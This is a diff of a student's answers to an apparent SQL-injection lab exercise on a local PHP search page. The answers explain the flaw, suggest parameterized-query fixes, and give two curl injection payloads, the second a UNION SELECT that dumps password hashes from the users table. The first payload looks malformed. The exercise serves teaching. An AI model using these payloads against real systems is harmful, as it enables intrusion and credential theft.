@@ -2,15 +2,28 @@
 
 1) (0.25 pts) 
  Explain why this application is vulnerable. 
+ The app is vulnerable because it does not sanitize the input from the user, it allows the user to construct a SQL query with illegal characters
  
 2) (0.25 pts)
  Provide a curl command that exploits this vulnerability 
+ curl -G "http://localhost:9000/search.php?q=%27%3B+and+%27x%27+%3D+%27x%27--"
 
 3) (0.25 pts)
  Provide a diff or fixed lines that fix this issue
+we need to use parameterized queries with placeholders that use the entire query and not let escapes
+$query = "SELECT id, username, email FROM users WHERE username = :username";
+$result = $db->prepare($query);
+$result->execute(['username' => $q]);
+
+$query = "SELECT id, username, email FROM users WHERE username LIKE :search OR email LIKE :search";
+$result = $db->prepare($query);
+$result->execute(['search' => '%' . $q . '%']);
+
+$rows = $result;
 
 4) (0.25 pts) 
 Provide a curl command that will extracts the passwords. 
 E.g., output should inlcude this:
 alice — $2y$10$AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 (note additional output is fine) as long as it also shows every users' password from the DB
+ curl -G "http://localhost:9000/search.php?q=%27+union+select+id%2C+email%2C+password_hash+from+users%3B--"
